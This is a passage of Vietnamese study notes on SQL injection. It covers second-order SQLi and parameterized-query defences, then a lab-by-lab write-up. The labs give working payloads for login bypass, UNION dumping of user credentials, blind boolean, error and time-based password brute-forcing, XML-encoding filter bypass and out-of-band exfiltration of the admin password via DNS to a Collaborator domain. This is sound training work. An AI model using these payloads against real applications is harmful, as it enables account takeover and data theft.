    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
Chuỗi này sẽ được giải mã (decode) ở phía server trước khi được gửi đến bộ thông dịch SQL.
## Second-order SQLi
**SQL injection bậc nhất (First-order SQL injection)** xảy ra khi ứng dụng xử lý **dữ liệu đầu vào từ một HTTP request** và trực tiếp đưa dữ liệu đó vào một câu truy vấn SQL một cách không an toàn.

**SQL injection bậc hai (Second-order SQL injection)** xảy ra khi ứng dụng **lấy dữ liệu đầu vào từ HTTP request và lưu trữ nó để sử dụng sau này**. Việc lưu trữ này thường được thực hiện trong cơ sở dữ liệu, nhưng **không có lỗ hổng xảy ra ngay tại điểm lưu trữ**.

Sau đó, khi xử lý một HTTP request khác, ứng dụng **truy xuất dữ liệu đã lưu** và đưa nó vào câu truy vấn SQL một cách **không an toàn**. Vì lý do này, second-order SQL injection còn được gọi là **stored SQL injection** (SQL injection lưu trữ).

Second-order SQL injection thường xảy ra trong các tình huống mà **lập trình viên đã nhận thức về lỗ hổng SQL injection**, nên họ xử lý đầu vào ban đầu khi lưu trữ vào cơ sở dữ liệu một cách **an toàn**.

Khi dữ liệu này được xử lý sau đó, lập trình viên cho rằng dữ liệu **an toàn** vì nó đã được lưu trữ an toàn trước đó. **Tuy nhiên**, tại thời điểm sử dụng dữ liệu này, nó lại được xử lý **không an toàn**, vì lập trình viên **sai lầm cho rằng dữ liệu có thể tin cậy**.

## Phòng chống SQLi
Bạn có thể phòng hầu hết các trường hợp SQL injection bằng cách sử dụng **parameterized queries** thay vì **nối chuỗi trực tiếp** vào câu truy vấn. Các parameterized queries này còn được gọi là **prepared statements**.

Ví dụ, đoạn mã sau **dễ bị SQL injection** vì dữ liệu đầu vào từ người dùng được **nối trực tiếp vào câu truy vấn**:

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```
Có thể viết lại đoạn mã để ngăn dữ liệu đầu vào ảnh hưởng đến cấu trúc truy vấn như sau:
```
PreparedStatement statement = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
Trong ví dụ này, giá trị của `input` **không thể thay đổi cấu trúc câu truy vấn SQL**, nhờ vậy phòng chống SQL injection hiệu quả.

Bạn có thể sử dụng **parameterized queries** cho bất kỳ tình huống nào mà **dữ liệu không tin cậy** xuất hiện dưới dạng **giá trị trong câu truy vấn**, bao gồm:

- Trong **mệnh đề `WHERE`**.
- Trong các giá trị của câu lệnh `INSERT` hoặc `UPDATE`.

Tuy nhiên, parameterized queries **không thể dùng** để xử lý dữ liệu không tin cậy ở những phần khác của câu truy vấn, như:

- Tên bảng hoặc tên cột.
- Mệnh đề **`ORDER BY`**.

Các chức năng của ứng dụng mà chèn dữ liệu không tin cậy vào những phần này cần áp dụng **cách tiếp cận khác**, ví dụ:

- **Whitelisting**: chỉ cho phép các giá trị hợp lệ.
- Sử dụng **logic khác** để đạt được hành vi mong muốn mà không chèn dữ liệu không tin cậy trực tiếp.

Để một **parameterized query** thực sự hiệu quả trong việc ngăn SQL injection, **chuỗi câu truy vấn phải luôn là một hằng số được mã hóa cứng**. Nó **không bao giờ được chứa dữ liệu biến động** từ bất kỳ nguồn nào.

Đừng có nghĩ rằng bạn có thể **quyết định từng trường hợp** xem dữ liệu có đáng tin hay không, rồi tiếp tục **nối chuỗi trực tiếp trong các trường hợp được cho là an toàn**.

- Rất dễ phạm sai lầm về nguồn gốc dữ liệu.
- Hoặc các thay đổi trong các phần khác của code có thể làm dữ liệu "đáng tin" trở nên ko đáng tin nữa
# WU 16 lab 

- [x] lí thuyết sql
- [x] SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- [x] SQL injection vulnerability allowing login bypass
- [x] SQL injection UNION attack - Determining the number of columns returns by the query
- [x] SQL injection UNION attack - Finding a column containing text
- [x] SQL injection UNION attack - Retrieving data from other tables
- [x] SQL injection UNION attack - Retrieving multiple values in a single column
- [x] SQL injection - Querying the database type and version (Oracle)
- [x] SQL injection - Querying the database type and version (MySQL/Microsoft)
- [x] SQL injection - Listing the database contents (non-Oracle)
- [x] SQL injection - Listing the database contents (Oracle)
- [x] Blind SQL injection with conditional responses
- [x] Blind SQL injection with conditional errors
- [x] Visible error-based SQL injection
- [x] Blind SQL injection with time delays
- [x] Blind SQL injection with time delays and information retrieval
- [x] Blind SQL injection with out-of-band interaction
- [x] SQL injection with filter bypass via XML encoding
### SQLi vulnerability in WHERE clause allowing retrieval of hidden data
![[Pasted image 20260324210121.png]]

![[Pasted image 20260324210353.png]]

- dùng burp bắt gói tin và sửa request để chèn đoạn mã sqli đơn giản
![[Pasted image 20260324210611.png]]
![[Pasted image 20260324210812.png]]

### SQL injection vulnerability allow login bypass
![[Pasted image 20260414212227.png]]

- trường **username**: administrator và **password**: ' OR 1=1 -- để bypass hoặc đơn giản là nhập **administrator' --** và password bất kì 

![[Pasted image 20260414212326.png]]
### SQLi UNION attack, determining the number of columns returnd by the query
dùng burp bắt request truy vấn 1 sản phẩm:
![[Pasted image 20260414220105.png]]
- như lí thuyết trình bày ở trên, đầu tiên cần xác định số cột trong bảng
chèn thêm đoạn mã `' UNION SELECT NULL--` vào sau request GET, tăng dần **NULL** đến khi server ko còn báo lỗi
![[Pasted image 20260414220522.png]]
![[Pasted image 20260414220600.png]]

### SQLi UNION attack, finding a column containing text

![[Pasted image 20260414221213.png]]
- đầu tiên vẫn là xác định số cột để có thể query với UNION
![[Pasted image 20260414221443.png]]
- thay thế lần lượt chuỗi **'S3hKCu'** vào từng giá trị **NULL**, cột 2 hiển thị giá trị trả về thõa mãn yêu cầu
![[Pasted image 20260414222623.png]]

### SQLi UNION attack retrieving data from other tables
![[Pasted image 20260414223057.png]]

- xác định số lượng cột trong bảng dữ liệu: 2 cột
![[Pasted image 20260414223145.png]]

-  và 2 cột đều có dạng text: ![[Pasted image 20260414223413.png]]
- sử dụng UNION để truy xuất thông tin tài khoản mật khẩu
![[Pasted image 20260414223918.png]]
![[Pasted image 20260414223929.png]]


### SQLi UNION attack, retrieving multiple values in a single column

![[Pasted image 20260414224443.png]]
- bảng dữ liệu có 2 cột, chỉ cột thứ 2 có dữ liệu dạng text
![[Pasted image 20260414224646.png]]
- sử dụng UNION để truy vấn nhiều giá trị trong 1 cột:
`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
![[Pasted image 20260414224820.png]]

### SQLi attack, querying db type and version on Oracle
- đầu tiên vẫn là xác định số cột của bảng db và cả 2 đều chứa text
![[Pasted image 20260414230604.png]]

- theo cheat sheet, gửi payload: 
- ![[Pasted image 20260414230911.png]]

![[Pasted image 20260414230927.png]]


### SQLi attack, querying db type on MySQL, Microsoft

![[Pasted image 20260414231218.png]]
Câu truy vấn với MySQL có dấu cách sau --

![[Pasted image 20260414231323.png]]

- theo cheat sheet, cú pháp truy xuất version db của MySQL và Microsoft tương tự nhau là `@@version`
![[Pasted image 20260414231538.png]]

### SQLi attack, listing the db contents on non-oracle db
![[Pasted image 20260414232018.png]]
- db có 2 cột chứa text
- theo cheat sheet, mysql, microsoft và và postgre đều chung cú pháp để truy vấn thông tin bảng
![[Pasted image 20260414234043.png]]

- cột users_faitec có khả năng chứa thông tin user
![[Pasted image 20260414234518.png]]

![[Pasted image 20260414234711.png]]

- thấy 2 cột username .... và password trên có khả năng chứa thông tin login => truy vấn lấy dữ liệu 2 cột của bảng users_faitec trên
![[Pasted image 20260414234950.png]]


### SQLi attack, listing the db contents on Oracle

- có 2 cột chứa text
![[Pasted image 20260414235220.png]]

- truy vấn để lấy tất cả các bảng dữ liệu
![[Pasted image 20260414235518.png]]
![[Pasted image 20260414235615.png]]
bảng users_bpisqr có thể chứa thông tin login

- query với payload: `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_BPISQR'--` để lấy thông tin các cột
![[Pasted image 20260414235930.png]]

- truy vấn với payload: `'+UNION+SELECT+USERNAME_AXLEUG,+PASSWORD_BBXQZC+FROM+USERS_BPISQR--`
để lấy thông tin username và pw

![[Pasted image 20260415000222.png]]
### Blind SQLi with conditional response

- ứng dụng sử dụng tracking cookie để phân tích và sử dụng sql để query giá trị, ko có thông tin trả về nhưng có dòng chữ `welcome back` trả về sau mỗi query
![[Pasted image 20260415002248.png]]

- thử chèn lần lượt 2 payload vào cookie: ' AND '1'='1 và 'AND '1'='2
	- có thể thấy khi phép AND sai thì dòng `welcome back` biến mất => boolean SQL, có thể test từng kí tự với điều kiện boolean để xem kết quả

![[Pasted image 20260415002240.png]]
![[Pasted image 20260415002640.png]]

- chèn payload: `' AND (SELECT '1' FROM users LIMIT 1)='1`
![[Pasted image 20260415002907.png]]
=> xác nhận có bảng users trong db

- payload: `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
![[Pasted image 20260415003452.png]]
=> có 1 user là administrator trong users

- sử dụng burp intruder để brute-force mật khẩu
- xác định độ dài của mật khẩu
![[Pasted image 20260415003947.png]]

khi tới payload: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a` thì dòng welcome back vẫn còn, lên tới 20 thì mất => password có 20 kí tự

- brute-force từng kí tự để xác định mật khẩu cuối cùng, dùng hàm substring() với payload dạng:
`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

![[Pasted image 20260415004637.png]]
Sử dụng **cluster bomb attack** trên intruder để để truyền đồng thời 2 wordlist vào payload. nó sẽ duyệt qua tất cả các kí tự của $a$ (a-z, 0-9) của chữ cái đầu tiên của pw

=> matching regex cụm từ: 'welcome back' để lấy mk cuối cùng
![[Pasted image 20260415004837.png]]
9oueeydnt4mgrpyzuube
![[Pasted image 20260415005014.png]]


### Blind SQLi with conditional errors

Tương tự, app sử dụng tracking cookie để phân tích, và truy vấn sql bao gồm cookie
![[Pasted image 20260415005823.png]]
chèn dấu ' thì báo lỗi 500 còn '' thì ko có thông báo lỗi

- payload: `'||(SELECT '')||'` báo lỗi
![[Pasted image 20260415010039.png]]

=> app sử dụng oracle

- thử 1 truy vấn hợp lệ vào 1 bảng ko tồn tại, server báo lỗi 500
![[Pasted image 20260415045038.png]]

- thử 1 payload khác:
![[Pasted image 20260415045204.png]]

![[Pasted image 20260415045237.png]]

=> câu lệnh Case kiểm tra 1 điều kiện và đánh giá thành 1 biểu thức nếu điều kiện đúng, và một biểu thức khác nếu điều kiện sai. payload 1 chứa phép chia cho 0 nên gây lỗi. payload 2 điều kiện sai nên nhánh else được thực thi nên ko có lỗi
=> lợi dụng điều này để thực thi bước tiếp theo: kiểm tra xem administrator có tồn tại

![[Pasted image 20260415050051.png]]

server lỗi => administrator tồn tại

giải thích cơ chế:
```
SELECT CASE 
  WHEN (1=1) THEN TO_CHAR(1/0) 
  ELSE '' 
END 
FROM users 
WHERE username='administrator'
```
```
Thứ tự thực thi thực tế:

1. **FROM users**
2. **WHERE username='administrator'**
3. → xác định có bao nhiêu dòng (rows)
4. **VỚI MỖI dòng tìm được → mới chạy SELECT (CASE WHEN …)**
```
=> nếu ko có administrator thì query trả về ko có dòng nào => ko chạy case => ko kiểm tra lỗi => ko có chia 1/0 => 200 OK

- còn lại tương tự lab trên, ta lợi dụng điều kiện để bruteforce:
	- tìm độ dài password

![[Pasted image 20260415050442.png]]

tại intruder, payload chứa case `select độ dài password` sẽ thực thi phép 1/0, vì truy vấn có administrator tồn tại  => password > 20 sai nên pw có 20 kí tự
- dùng cluster bomd để bruteforce password từng kí tự từ 1-20 (a-z, 0-9), nếu server trả lỗi 500 => khớp điều kiện pw nên thực thi 1/0
![[Pasted image 20260415051030.png]]

33irq8q4z6ceas0nf2fk
![[Pasted image 20260415051133.png]]

### Visible error-based SQLi
![[Pasted image 20260415052005.png]]
thêm dấu ' vào sau cookie thì web thông báo lỗi chi tiết rằng thừa dấu ' ở cuối; khi thêm '-- thì server lại trả về 200 ok

- dùng thử hàm CAST() như lí thuyết trên

![[Pasted image 20260415052334.png]]
=> thông báo rằng điều kiện AND phải là dạng boolean, => thêm 1= vào trước AND
![[Pasted image 20260415052527.png]]

query đã ổn
- thay đổi payload để truy xuất tên user từ db
![[Pasted image 20260415052852.png]]

=> lỗi, query bị cắt ngắn kí tự
![[Pasted image 20260415052942.png]]
=> xóa cookie đi thì lại xuất hiện lỗi khác, có vẻ truy vấn đúng nhưng nó trả về nhiều hơn 1 hàng
![[Pasted image 20260415053102.png]]
=> thêm LIMIT 1 để giới hạn trong 1 hàng, lỗi mới đã leak là administrator là user đầu tiên trong bảng, ko thể đổi sang dạng integer

=> biết đc có tài khoản administator, tìm kiếm ps đăng nhập
![[Pasted image 20260415053311.png]]
### Blind SQLi with time delays
yêu cầu là truy vấn SQLi để server trả về response với độ trễ 10s
![[Pasted image 20260415053915.png]]

![[Pasted image 20260415053729.png]]

### Blind SQLi with time delays and information retrieval
![[Pasted image 20260415054109.png]]

payload dùng case,  vì điều kiện đúng (1=1) nên server delay 10s, thử đổi lại 1=0 thì server response ngay lập tức => có thể lợi dụng điều kiện booliean này để truy vấn db

- server phản hồi chậm => có administrator tồn tại
![[Pasted image 20260415054533.png]]
-
- đã có administrator xác nhận tồn tại, brute-force để xác định độ dài pw
![[Pasted image 20260415055309.png]]
password có 20 kí tự

dùng clusterbomb để brute-force mật khẩu

![[Pasted image 20260415060026.png]]

ma00rf08heu1wwhmsbpd

### Blind SQLi Out of band
dựa vào cheat sheet được cung cấp 
![[Pasted image 20260415061956.png]]

- mục tiêu là khiến server thực hiện 1 dns lookup đến burp collaborator => payload sử dụng 1 hàm tích hợp trong db để thực hiện yêu cầu mạng.
- hàm `extractvalue` và `xmltype` cố gắng xử lí một thực thể bên ngoài. để làm việc đó, nó phải gửi 1 request http/dns đến domain

![[Pasted image 20260415061340.png]]

### Blind SQLi Out of Band data exfiltration
mục tiêu ko chỉ tương tác mà lấy được mật khẩu của admin thông qua domain dns
![[Pasted image 20260415062008.png]]

- thay vì gửi 1 domain tĩnh, lồng kết quả câu lệnh `select pasword ` vào làm subdomain
- dấu || để nối chuối (Oracle)
- ví dụ pass là minh thì db sẽ cố gắng truy cập vào `http://minh.Your-colla-id.oastify.com`
- yêu cầu này gửi đến burp collaborator
=> khi nhìn vào log của collaborator, phần tiền tố sẽ chứa pass của admin
![[Pasted image 20260415061907.png]]

![[Pasted image 20260415061827.png]]


### SQL injection with filter bypass via XML encoding

![[Pasted image 20260422101714.png]]

- ta thấy tính năng kiểm tra hàng trong kho gửi ProductId và StoreId dưới định dạng XML

![[Pasted image 20260422101828.png]]

- nếu thay giá trị số thành các biểu thức => vẫn ok
![[Pasted image 20260422102503.png]]
![[Pasted image 20260422102512.png]]

- chèn thử câu lệnh: `UNION SELECT NULL` thì bị detect

![[Pasted image 20260422102604.png]]


- dùng cyberchef để thử encode payload trước khi gửi: thì response trả về 200 ok
![[Pasted image 20260422103323.png]]

- encode payload:
![[Pasted image 20260422103439.png]]

![[Pasted image 20260422103452.png]]

